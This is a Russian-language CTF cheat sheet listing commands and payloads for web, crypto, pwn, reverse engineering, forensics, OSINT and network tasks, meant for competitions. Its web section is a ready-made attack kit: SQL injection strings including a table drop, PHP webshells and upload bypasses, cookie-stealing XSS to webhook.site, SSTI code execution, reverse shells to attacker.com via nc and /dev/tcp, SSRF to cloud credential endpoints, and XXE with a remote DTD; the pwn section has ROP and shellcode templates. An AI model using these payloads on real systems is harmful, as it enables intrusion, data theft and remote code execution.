# 🏴 CTF — Полный командный чеклист

Только команды, сгруппированные по категориям. Без теории.

---

## WEB

### Recon
```bash
whatweb http://target
curl -s -I http://target
curl -s http://target | grep -iE "script|comment|<!--"
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip,old,git
gobuster dir -u http://target -w /usr/share/wordlists/seclists/Discovery/Web-Content/raw-best1050.txt -t 50
ffuf -u http://target/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
ffuf -u http://target/FUZZ -w subdomains.txt -H "Host: FUZZ.target"
gobuster vhost -u http://target -w subdomains.txt
nikto -h http://target
wpscan --url http://target --enumerate u,p,t              # если WordPress
curl http://target/.git/config
git clone https://github.com/internetwache/GitTools
./GitTools/Dumper/gitdumper.sh http://target/.git/ ./dump && cd dump && git log -p
curl http://target/.env
curl http://target/.htaccess
curl http://target/composer.json
curl http://target/package.json
wafw00f http://target
```

### SQLi
```bash
sqlmap -u "http://target/page?id=1" --batch --dbs
sqlmap -u "http://target/page?id=1" --batch -D dbname --tables
sqlmap -u "http://target/page?id=1" --batch -D dbname -T users --dump
sqlmap -u "http://target/page?id=1" --batch --os-shell
sqlmap -r request.txt --batch --dbs                          # запрос из Burp
sqlmap -u "http://target/page?id=1*" --batch --technique=T   # time-based
sqlmap -u "http://target/login" --data="user=a&pass=b" --batch --level=5 --risk=3
sqlmap --list-tampers
sqlmap -u "http://target/page?id=1" --batch --tamper=space2comment --dbs
```
Ручные payload'ы:
```
' OR '1'='1
' OR '1'='1' -- -
' OR 1=1#
admin'-- -
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -
1; DROP TABLE users-- -
' OR '1'='1' LIMIT 1 -- -
```

### LFI / RFI / Path Traversal
```
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd
?file=..%2f..%2f..%2fetc%2fpasswd
?file=..%252f..%252f..%252fetc%252fpasswd
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/read=convert.base64-encode/resource=config.php
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
?file=/proc/self/environ
?file=/var/log/apache2/access.log
?file=/var/log/nginx/access.log
?file=php://input
?file=expect://id
?file=http://attacker.com/shell.txt
```
```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
```

### XSS
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
javascript:alert(1)
<script>fetch('https://webhook.site/ID?c='+document.cookie)</script>
<script>new Image().src='https://webhook.site/ID?c='+document.cookie</script>
<script>fetch('https://webhook.site/ID',{method:'POST',body:document.cookie})</script>
<iframe src=javascript:alert(1)>
<script>document.location='https://webhook.site/ID?c='+document.cookie</script>
```

### SSTI
```
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
${{7*7}}
@(7*7)
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[401]('/etc/passwd').read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{% endif %}{% endfor %}
```

### Command Injection
```
; id
; whoami
| id
|| id
& id
&& id
`id`
$(id)
; cat /flag
; cat /flag.txt
%0a id
| nc attacker.com 4444 -e /bin/sh
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

### File Upload Bypass
```
shell.php
shell.phtml
shell.php5
shell.php7
shell.pHp
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
shell.php;.jpg
.htaccess       (AddType application/x-httpd-php .jpg)
```
Веб-шеллы:
```php
<?php system($_GET['c']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?php passthru($_REQUEST['c']); ?>
```
```bash
curl -F "file=@shell.php" http://target/upload
curl "http://target/uploads/shell.php?c=id"
```

### SSRF
```
http://127.0.0.1/admin
http://localhost/admin
http://0.0.0.0/
http://[::1]/
http://127.1/
http://2130706433/                     # decimal IP = 127.0.0.1
http://0x7f000001/                     # hex IP
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
```

### XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe; ]>
```
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>
```
```bash
python3 -m http.server 80            # хостить evil.dtd для OOB
```

### JWT
```bash
echo "<jwt>" | cut -d. -f1 | base64 -d
echo "<jwt>" | cut -d. -f2 | base64 -d
jwt_tool <token>
jwt_tool <token> -T
jwt_tool <token> -X a                                  # alg=none attack
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt
jwt_tool <token> -S hs256 -k key.pub -I -pc role -pv admin    # RS256→HS256 confusion
python3 -c "import jwt; print(jwt.encode({'user':'admin'}, 'secret', algorithm='HS256'))"
```

### Deserialization
```bash
phpggc -l
phpggc Laravel/RCE1 system 'id' -b
phpggc Symfony/RCE4 system 'id' -b
java -jar ysoserial.jar CommonsCollections6 'id' > payload.bin
java -jar ysoserial.jar -p ROME 'id' | base64
```

### Race Condition
```bash
# Burp Intruder: Null payloads, Concurrent requests, Threads=30+
ffuf -u http://target/redeem -X POST -d "code=X" -H "Content-Type: application/x-www-form-urlencoded" -t 50 -w payloads.txt:FUZZ
```

### Proxy / Burp
```
Proxy → Intercept
Repeater → ручная модификация запроса
Intruder → Sniper/Cluster bomb брутфорс параметра
Decoder → base64/url/hex encode-decode на лету
Comparer → diff двух ответов
```

---

## CRYPTO

### Кодировки (CyberChef Magic Wand — первый шаг всегда)
```bash
echo "<text>" | base64 -d
echo "<text>" | base64 -D
echo "<text>" | base32 -d
echo "<hex>" | xxd -r -p
echo "<text>" | tr 'A-Za-z' 'N-ZA-Mn-za-m'     # ROT13
echo "<text>" | rev
echo "<binary>" | python3 -c "import sys; print(''.join(chr(int(b,2)) for b in sys.stdin.read().split()))"
python3 -c "print(bytes.fromhex('<hex>').decode())"
```

### RSA
```bash
python3 -c "from sympy import factorint; print(factorint(N))"
python3 -c "from Crypto.Util.number import long_to_bytes; print(long_to_bytes(M))"
git clone https://github.com/RsaCtfTool/RsaCtfTool
python3 RsaCtfTool.py --publickey key.pub --uncipherfile cipher.txt
python3 RsaCtfTool.py -n N -e E --uncipher C
python3 RsaCtfTool.py --publickey key.pub --private
```
```python
from gmpy2 import iroot
m, exact = iroot(c, 3)

from Crypto.Util.number import inverse, long_to_bytes
phi = (p-1)*(q-1)
d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))

# common modulus
from sympy import gcdex
a, b, g = gcdex(e1, e2)
m = (pow(c1, a, n) * pow(c2, b, n)) % n

# Wiener's attack (continued fractions)
pip install owiener
python3 -c "import owiener; d = owiener.attack(e, n); print(d)"

# Fermat factorization (p,q близки)
import gmpy2
a = gmpy2.isqrt(n) + 1
while True:
    b2 = a*a - n
    b = gmpy2.isqrt(b2)
    if b*b == b2:
        p, q = a+b, a-b
        break
    a += 1
```
```bash
openssl rsa -in key.pem -text -noout
openssl rsa -pubin -in pub.pem -text -noout
openssl x509 -in cert.pem -text -noout
```

### AES / Block ciphers
```python
from Crypto.Cipher import AES
cipher = AES.new(key, AES.MODE_ECB)
cipher = AES.new(key, AES.MODE_CBC, iv)
pt = cipher.decrypt(ct)
```
```bash
padbuster http://target/decrypt <sample-ciphertext> <block-size> -encoding 0 -cookies "auth=<ciphertext>"
```

### XOR
```python
ct = bytes.fromhex('...')
key = b'knownpart'
pt = bytes(a ^ b for a, b in zip(ct, (key * (len(ct)//len(key)+1))))

for i in range(256):
    pt = bytes(a ^ i for a in ct)
    if b'flag' in pt.lower():
        print(i, pt)
```
```bash
xortool ciphertext.bin
xortool -b ciphertext.bin                      # bruteforce key length
xortool-xor -s "known_plaintext" -f ciphertext.bin
```

### Hashing
```bash
hashid '<hash>'
hash-identifier
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
john --show hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt       # MD5
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt     # SHA1
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt    # SHA256
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt    # NTLM
hashcat -a 3 -m 0 hash.txt 'flag{?a?a?a?a?a?a?a?a?a?a}'
hashcat --show hash.txt
```

### Length Extension
```bash
hashpump -s '<hash>' -d '<original-data>' -a '<data-to-append>' -k <key-length-guess>
```

### Misc crypto
```bash
openssl enc -aes-256-cbc -d -in file.enc -out file.dec -k password
openssl enc -d -base64 -in file.b64
ssh-keygen -lf id_rsa.pub                       # fingerprint
john --wordlist=rockyou.txt id_rsa.john          # сломать passphrase ключа
ssh2john id_rsa > id_rsa.john
```

---

## PWN

### Recon бинарника
```bash
file ./binary
checksec ./binary
checksec --file=./binary
strings ./binary | grep -iE "flag|win|system|/bin/sh"
objdump -d ./binary
objdump -d ./binary | grep -A20 "<main>:"
objdump -d ./binary | grep -i win
objdump -R ./binary                             # relocations / GOT
readelf -h ./binary
readelf -S ./binary
readelf -d ./binary
nm ./binary
ltrace ./binary
strace ./binary
gdb ./binary
```

### GDB / PEDA / pwndbg
```
file ./binary
run
break main
break *0x<addr>
info functions
info registers
x/20xg $rsp
x/s $rdi
disassemble main
pattern create 200
pattern offset <value>
checksec
vmmap
```

### Pwntools boilerplate
```python
from pwn import *
context.binary = elf = ELF('./binary')
context.log_level = 'debug'

io = process('./binary')
# io = remote('target', 1337)
# io = gdb.debug('./binary', 'break main')

offset = cyclic_find(0x61616161)

payload = b'A' * offset + p64(elf.sym['win'])
io.sendline(payload)
io.interactive()
```

### ret2win
```python
payload = flat(b'A' * offset, elf.sym['win'])
```

### ret2libc
```python
libc = ELF('./libc.so.6')
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call(elf.sym['main'])
io.sendline(flat(b'A'*offset, rop.chain()))
io.recvuntil(b'...')
leak = u64(io.recvline().strip().ljust(8, b'\0'))
libc.address = leak - libc.sym['puts']
rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh\0'))])
io.sendline(flat(b'A'*offset, rop2.chain()))
io.interactive()
```

### ROP gadgets
```bash
ROPgadget --binary ./binary
ROPgadget --binary ./binary --only "pop|ret"
ROPgadget --binary ./binary --string "/bin/sh"
ropper --file ./binary --search "pop rdi"
```

### Format string
```python
io.sendline(b'%p %p %p %p %p %p %p %p')
io.sendline(b'%7$p')
io.sendline(b'AAAA %7$p')

payload = fmtstr_payload(offset, {elf.got['exit']: elf.sym['win']})
io.sendline(payload)
```
```bash
objdump -d ./binary | grep -B5 printf
```

### Shellcode
```python
shellcode = asm(shellcraft.sh())
shellcode = asm(shellcraft.execve('/bin/sh', ['/bin/sh'], 0))
payload = shellcode.ljust(offset, b'A') + p64(stack_addr)
```
```bash
msfvenom -p linux/x64/exec CMD=/bin/sh -f python
```

### Heap
```bash
gdb -ex 'source ~/.gdbinit-gef.py' ./binary
heap
bins
chunks
```

### Патчинг libc/ld
```bash
pwninit
patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./binary
patchelf --replace-needed libc.so.6 ./libc.so.6 ./binary
```

---

## REVERSE

### Общий recon
```bash
file ./binary
strings ./binary | grep -iE "flag|pass|correct|key"
strings -n 8 ./binary
ltrace ./binary
strace ./binary
ltrace -f ./binary
objdump -d ./binary
objdump -T ./binary
readelf -a ./binary
upx -d ./binary
binwalk ./binary
```

### Ghidra / radare2 / rizin
```bash
ghidra
r2 -A ./binary
```
r2 команды:
```
aaa
afl
pdf @ main
pdf @ sym.check_password
s main
VV
iz
pdc
```

### Frida (динамика)
```bash
frida-trace -i "strcmp" ./binary
frida-trace -i "strncmp" ./binary
frida-ps -U
frida -U -f com.target.app -l script.js
```

### .NET
```bash
dotnet-dump
dnSpy app.exe
ilspycmd app.exe
```

### Java / Android
```bash
jadx-gui app.apk
jadx -d out/ app.apk
jd-gui app.jar
apktool d app.apk
apktool b app_folder -o new.apk
unzip -o app.apk -d extracted
cd extracted && dex2jar classes.dex
d2j-dex2jar classes.dex
```

### Python exe
```bash
pip install pyinstxtractor
python pyinstxtractor.py app.exe
pip install decompyle3
decompyle3 main.pyc
uncompyle6 main.pyc
python3 -m dis main.pyc
```

### Патчинг байт
```bash
r2 -w ./binary
> s 0x<addr>
> wx 9090                 # NOP two bytes
> wa jmp 0x<addr>
```

### Z3 (решение constraint-based crackme)
```python
from z3 import *
s = Solver()
x = Int('x')
s.add(x * 2 + 5 == 17)
s.check()
s.model()
```

---

## FORENSICS

### Базовая разведка файла
```bash
file suspicious
xxd suspicious | head -5
xxd suspicious | tail -5
exiftool suspicious
exiftool -all suspicious
strings suspicious | grep -i flag
strings -n 10 suspicious
binwalk suspicious
binwalk -e suspicious
binwalk -A suspicious
foremost suspicious
foremost -i suspicious -o output/
scalpel suspicious
```

### Стеганография (изображения)
```bash
steghide info image.jpg
steghide extract -sf image.jpg
steghide extract -sf image.jpg -p ""
steghide extract -sf image.jpg -p password
stegseek image.jpg /usr/share/wordlists/rockyou.txt
zsteg image.png
zsteg -a image.png
zsteg image.png -E "b1,r,lsb,xy"
stegsolve.jar
pngcheck -v image.png
convert image.png image.bmp
exiftool -gps:all image.jpg
```

### Аудио-стего
```bash
sonic-visualiser audio.wav
audacity audio.wav
```
```bash
python3 -c "
import wave
w = wave.open('audio.wav','rb')
print(w.getparams())
"
```

### Архивы
```bash
unzip file.zip
unzip -l file.zip
zip2john protected.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt protected.zip
rar2john file.rar > hash.txt
7z2john.pl file.7z > hash.txt
7z x file.7z
7z l file.7z
```

### PDF
```bash
pdftotext file.pdf out.txt
pdfimages file.pdf img
pdf-parser file.pdf
qpdf --decrypt in.pdf out.pdf
exiftool file.pdf
strings file.pdf | grep -i flag
pdfid.py file.pdf
```

### PCAP / Network forensics
```bash
tshark -r file.pcap
tshark -r file.pcap -Y "http"
tshark -r file.pcap -Y "http.request.method==POST" -T fields -e http.file_data
tshark -r file.pcap --export-objects http,./out/
tshark -r file.pcap --export-objects smb,./out/
tshark -r file.pcap --export-objects tftp,./out/
tshark -r file.pcap -Y "ftp.request.command==USER or ftp.request.command==PASS"
tshark -r file.pcap -q -z conv,tcp
tshark -r file.pcap -Y dns -T fields -e dns.qry.name
tshark -r file.pcap -Y "tcp.stream eq 0" -T fields -e data
tshark -r file.pcap -T fields -e frame.number -e ip.src -e ip.dst -e tcp.flags
strings file.pcap | grep -i flag
```

### Memory forensics (Volatility 3)
```bash
volatility3 -f dump.raw windows.info
volatility3 -f dump.raw windows.pslist
volatility3 -f dump.raw windows.pstree
volatility3 -f dump.raw windows.cmdline
volatility3 -f dump.raw windows.filescan
volatility3 -f dump.raw windows.filescan | grep -i flag
volatility3 -f dump.raw windows.dumpfiles --pid <pid>
volatility3 -f dump.raw windows.netscan
volatility3 -f dump.raw windows.registry.hivelist
volatility3 -f dump.raw windows.registry.printkey --key "..."
volatility3 -f dump.raw windows.memmap --pid <pid>
volatility3 -f dump.raw linux.pslist
volatility3 -f dump.raw linux.bash
```

### Disk image
```bash
mmls disk.img
fsstat disk.img
fls -r disk.img
icat disk.img <inode> > recovered_file
mount -o ro,loop,offset=$((512*2048)) disk.img /mnt
autopsy
testdisk disk.img
photorec disk.img
```

### Git forensics
```bash
git log --all
git log -p
git diff <commit1> <commit2>
git show <commit>
git stash list
git reflog
git fsck --unreachable
git cat-file -p <hash>
```

---

## OSINT

```bash
exiftool photo.jpg
exiftool -gps:all photo.jpg
sherlock username
whois domain.com
dig domain.com ANY
dig domain.com MX
nslookup domain.com
theHarvester -d domain.com -b all
holehe email@example.com
```
Веб-сервисы (без команд, руками):
```
images.google.com (reverse image search)
tineye.com
yandex.com/images
web.archive.org
shodan.io
crt.sh (сертификаты → поддомены)
haveibeenpwned.com
```

---

## NETWORK (вне pcap — живые задачи)

```bash
nmap -sC -sV -p- target
nmap -A target
nmap -sU target
nc -nv target 1337
nc -lvnp 4444
ncat --ssl target 443
openssl s_client -connect target:443
curl -v telnet://target:1337
socat - TCP:target:1337
```

---

## MISC

```bash
zbarimg qr.png
zbarimg -q qr.png
python3 -c "import qrcode; qrcode.make('data').save('out.png')"
xxd file | less
python3 -m base64 -d file.b64
echo "..." | python3 -c "import sys,codecs; print(codecs.decode(sys.stdin.read(),'rot13'))"
```
Эзотерические языки — найти онлайн-интерпретатор по названию (Brainfuck, Malbolge, Whitespace, Piet).
```bash
# Brainfuck локально
pip install brainfuck-interpreter
```
```bash
# Полиглоты / magic bytes multi-format
file --mime-type suspicious
binwalk -e suspicious
```

---

## CyberChef (держать открытой вкладку весь CTF)
```
Magic Wand (автоопределение)
From Base64 / To Base64
From Hex / To Hex
From Binary
ROT13 Brute Force
XOR Brute Force
From Morse Code
JWT Decode
Extract Files
Detect File Type
Fork (построчная обработка)
```
